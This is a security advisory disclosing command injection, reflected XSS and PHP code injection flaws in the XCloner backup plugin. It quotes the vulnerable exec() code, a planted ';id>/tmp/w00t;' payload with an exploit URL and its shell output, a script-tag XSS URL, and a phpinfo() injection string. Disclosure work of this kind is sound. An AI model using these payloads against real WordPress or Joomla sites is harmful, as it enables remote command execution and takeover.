Vendor: Ovidiu Liuta, @thinkovi
Vendor Contact: @thinkovi
Description: XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!
Vulnerability:
Lines 1129 of 1135 in cloner.functions.php

1129 $excluded_cmd = "";
1130 if ($fp = @fopen($_REQUEST['
1130 if ($fp = @fopen($_REQUEST['excl_manual'], "r")) {
1131 while (!feof($fp))
1132 $excluded_cmd .= fread($fp, 1024);
1133
1134 fclose($fp);
1135 }

Line 1205:
If configured for manual mode the contents of $excluded_cmd are passed to exec();
1205 exec($_CONFIG[tarpath] . " $excluded_cmd ". $_CONFIG['tarcompress'] ."vf $backup_file update $file");
We need to supply a file with a list of commands to execute in it, we can create this via the backup comments feature. It creates a file under administrator/backups/.comments with whatever you want in it. Like ;id>/tmp/w00t;

Then change the configuration to manual backup by selecting the radio button and perform a backup.
Hit this link:
http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_cloner&task=refresh&json=0&startf=300&lines=6204&backup=backup_20150511_
2028_sqlnodrop.tar&excl_manual=/usr/share/wordpress/administrator/backups/.comments

In a shell:
$ cat /tmp/w00t
uid=33(wwwdata)
gid=33(wwwdata)
groups=33(wwwdata)

Also $excluded_cmd is XSS

http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_cloner&task=refresh&json=0&startf=800&lines=6204&backup=backup_20150511_
2028_sqlnodrop.tar&excl_manual=’><script>alert(‘w00t’);</script>

Chrome XSS alert:

The XSS Auditor refused to execute a script in
'http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_…lnodrop.tar&excl_manual=%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E' because
its source code was found within the request. The auditor was enabled as the server sent
neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.
plugins.php:403 The XSS Auditor refused to execute a script in

drop.tar&excl_manual=%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E' because
its source code was found within the request. The auditor was enabled as the server sent
neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.

The default template has an error with the LM_LOGIN_TEXT field so just clean that out or you’ll get a syntax error when trying to execute.
Adding foo”);phpinfo();define(“foo to the Translation LM_FRONT_* fields then browsing to language/italian.php you’ll execute phpinfo();.
